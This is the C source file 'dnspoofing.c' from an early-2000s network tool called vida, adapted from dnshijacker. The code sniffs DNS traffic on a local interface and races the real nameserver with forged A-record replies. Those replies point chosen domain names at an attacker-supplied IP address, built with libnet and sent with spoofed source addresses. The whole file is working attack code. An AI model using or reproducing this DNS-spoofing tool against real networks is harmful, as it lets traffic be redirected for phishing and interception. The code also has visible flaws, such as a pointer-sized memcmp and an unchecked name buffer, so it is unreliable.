/*____________________________________________*\
*                                              *
*                                              *
*                -= vida =-                    *
*       Visual Interactive Datapipe            *
*          no (c) 2002/03-2003/05              *
*                  v.0.8.0                     *
*                                              *
*    coded by                                  *
*    embyte -> embyte@madlab.it                *
*    lesion -> lesion@autisti.org              *
*                                              *
*    less README for features and more info    *
*                                              *
*    --------------------------------------    *
*                                              *
*    dnspoofing.c:                             *
*       -ripped from dnshijacker v1.2 of       *
*        pedram amini (pedram@redhive.com)     *
*        and riadacted for Vida                *
*       -sniff && spoof a dns query            *
*                                              *
\*____________________________________________*/

#include "include.h"

/* change it if u want */
#define IFACE "eth0"

/* protos */
int parse_dns(char *packet);
void dnshijacker();
void dnshijack_add(char *o_name, char *s_name);


libnet_t *l;
pcap_t *pd;
u_char ebuf[LIBNET_ERRBUF_SIZE];
char errbuf[PCAP_ERRBUF_SIZE];
struct pcap_pkthdr hdr;
char *packet;
int offset;			/* datalink offset */
struct bpf_program fp;
bpf_u_int32 netp, maskp;
static pthread_t sniffing;
u_short running=0;
struct dns_list
{
   char *original_name;         /* name request */
   char *spoofed_name;          /* name/ip answer */
   struct dns_list *next;
}
*dns_list = NULL;

void dnshijack_add(char *o_name, char *s_name)
{
   // add the new address in list
   if (dns_list == NULL)
     {
	dns_list = (struct dns_list *) malloc(sizeof(struct dns_list));
	dns_list->next = NULL;
     }
   else
     {
	dns_list->next =
	  (struct dns_list *) malloc(sizeof(struct dns_list));
	dns_list->next->next = dns_list;
	dns_list = dns_list->next;
     }

   dns_list->original_name = o_name;
   dns_list->spoofed_name = s_name;

   if (!running)
     {
	running=1;
	if ((pd = pcap_open_live(IFACE, BUFSIZ, 1, 10, errbuf)) == NULL)
	  {
	     info(1,"Operation not permitted");
	     return;
	  }

	pcap_lookupnet(IFACE, &netp, &maskp, errbuf);
	pcap_compile(pd, &fp, "udp and port 53", 1, maskp);
	pcap_setfilter(pd, &fp);
	pcap_freecode(&fp);
	
	switch (pcap_datalink(pd))
	  {
	   case DLT_EN10MB:
	     offset = 14;
	     break;
	   case DLT_IEEE802:
	     offset = 22;
	     break;
	   case DLT_FDDI:
	     offset = 21;
	     break;
	   case DLT_NULL:
	     offset = 4;
	     break;
	   default:
	     info(1,"Bad datalink type");
	     return;
	  }

	pthread_create(&sniffing, NULL, (void *) dnshijacker, NULL);

     }

   info (0,"DNS_Spoofer: Waiting for a DNS request");

}

void dnshijacker()
{
   while (1)
     {
	packet = (char *) pcap_next(pd, &hdr);
	if (packet == NULL) continue;
	parse_dns(packet);
     }
}

int parse_dns(char *packet)
{
   struct dns_list *tmp = dns_list;
   struct libnet_ipv4_hdr *ip;	/* ip header */
   struct libnet_udp_hdr *udp;	/* udp header */
   struct dnshdr *dns;		/* dns header */
   char *data,			/* pointer to dns payload */
     *data_backup,		/* we modify data so keep orig */
     name[128];			/* storate for lookup name */
   int datalen,		/* length of dns payload */
     c = 1;			/* used in name extraction */

   struct in_addr src, dst;	/* used for printing addresses */
   int packet_size;		/* size of our packet */
   struct cc_struct cc;         /* dns info struct */
   u_long rdata=0;
   
   ip = (struct libnet_ipv4_hdr *) (packet + offset);
   udp = (struct libnet_udp_hdr *) (packet + offset + LIBNET_IPV4_H);
   dns = (struct dnshdr *) (packet + offset + LIBNET_IPV4_H + LIBNET_UDP_H);
   data = (packet + offset + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNSV4_H);

    /*
     *  we modify the data pointer, so save the original position
     */

   data_backup = data;

    /*
     *  print dns packet source_address:port > destination_address:port
     */

   info(0,"dns activity: %s:%d > %s:%d", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport), inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));

    /*
     *  clean out our name array and grab length of name to convert
     */

   bzero((char *) &name, 128);
   bzero((struct cc_struct *) &cc, sizeof(struct cc_struct));
   datalen = strlen(data);

    /*
     *  convert name...
     *  dns names are of the form 3www7redhive3com
     *  so we start with the first number and drop that many chars into name[]
     *  then we move up the string that many chars and repeat the procedure
     *  we know to stop when we hit a null
     */

   while (c)
     {
	c = (char) *data;
	data++;
	strncat(name, data, c);
	data += c;
	strncat(name, ".", 1);
     }

    /*
     *  restore the data pointer
     */

   data = data_backup;

    /*
     * kill the trailing '.'
     */
   name[datalen - 1] = '\0';

    /*
     *  are we looking at a question or an answer?
     *
     *  We want onlt answers
     */

   if (htons(dns->qdcount) > 0 && htons(dns->ancount) == 0) ;
   else if (htons(dns->ancount) > 0)
     {
	//info(0,"[%s = Response]", name);
	return -1;
     }

    /*
     *  bake the cc
     */

   cc.src_address = ip->ip_src.s_addr;
   cc.dst_address = ip->ip_dst.s_addr;
   cc.src_port = udp->uh_sport;
   cc.dst_port = udp->uh_dport;
   cc.dns_id = dns->id;
   strncpy(cc.current_question, name, 128);

    /*
     *  check the question type
     *  the question type is stored in the 2 bytes after the variables length name
     *  if the question is not of type A we return since we are only spoofing those type answers
     */

   if (((int) *(data + datalen + 2)) == T_A)
     cc.is_a = 1;
   else
     {
	cc.is_a = 0;
	return -1;
     }

   /* init libnet_t */
   l = libnet_init(LIBNET_RAW4, NULL, ebuf);
   if (l == NULL)
     {
	info(0,"Error creating libnet file context: %s", ebuf);
	exit (-1);
     }

 
   cc.have_answer = 0;
   while (tmp != NULL)
     {
	if (!memcmp(cc.current_question, tmp->original_name, sizeof(tmp->original_name))) // DNS request equals my name!
	  {
	     /* resolve spoofed nameserv */
	     rdata = libnet_name2addr4(l, tmp->spoofed_name, 0);
	     cc.have_answer=1;
	     break;
	  }
	tmp = tmp->next;
     }

    /*
     *  check the following conditions before spoofing
     *  if any of these conditions are violated then no spoofing is done
     *  - we only want to spoof packets from a nameserver
     *  - we only want to spoof packets from questions of type A
     *  - we only want to spoof packets if we have an answer
     */

   if (!cc.have_answer) return -1;

    /*
     * build dns payload
     */

    /*
     * queries
     */

   memcpy (cc.payload, data, datalen + 5);

   /*
     * answer
     */

   memcpy (cc.payload + (datalen+5), data, datalen+5);
   memcpy (cc.payload + 2*(datalen+5), "\x00\x00\x00\x00\x00\x04", 6);
   *((u_long *) (cc.payload + 2*(datalen+5) + 6))=rdata;
   cc.payload_size=2*(datalen+5)+10;

   packet_size =  cc.payload_size + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNSV4_H;

   /* build packet */

   info(0,"Spoofing the DNS query");

   if ((libnet_build_dnsv4(ntohs(cc.dns_id),	/* dns id */
			   0x8180,	/* control flags (QR,AA,RD,RA) */
			   1,	/* number of questions */
			   1,	/* number of answer RR's */
			   0,	/* number of authority RR's */
			   0,	/* number of additional RR's */
			   cc.payload,	/* payload */
			   cc.payload_size,	/* payload lenght */
			   l,
			   0)) == -1)
     {
	info(0,"Error builing dns header");
	return -1;
     }

   if (libnet_build_udp(53,	                /* source port */
			ntohs(cc.src_port),	/* destination port */
			packet_size - LIBNET_IPV4_H,
			0,
			NULL,
			0,
			l,
			0) == -1)
     {
	info(0,"Error building udp header");
	return -1;
     }

   if (libnet_build_ipv4(packet_size,
			 0,	/* ip tos */
			 0,	/* ip id */
			 0,	/* fragmentation bits */
			 64,	/* ttl */
			 IPPROTO_UDP,	/* protocol */
			 0,
			 cc.dst_address,	/* source address */
			 cc.src_address,	/* destination address */
			 NULL,	/* payload */
			 0,	/* payload length */
			 l,
			 0) == -1)
     {
	info(0,"Error builing ip header");
	return -1;
     }

   if (libnet_write(l) == -1)
     {
	info(0,"Error: libnet_write: %s", strerror(errno));
     }
   
   libnet_destroy(l);

    /*
     *  announce what we've just done
     *  remember that we've swapped the addresses/ports
     */

   src.s_addr = cc.src_address;
   dst.s_addr = cc.dst_address;

   info(0,"DNS_Spoofer: spoofed answer: %s:%d > %s:%d", 
	inet_ntoa(dst), ntohs(cc.dst_port), inet_ntoa(src), ntohs(cc.src_port));

   return 0;
}
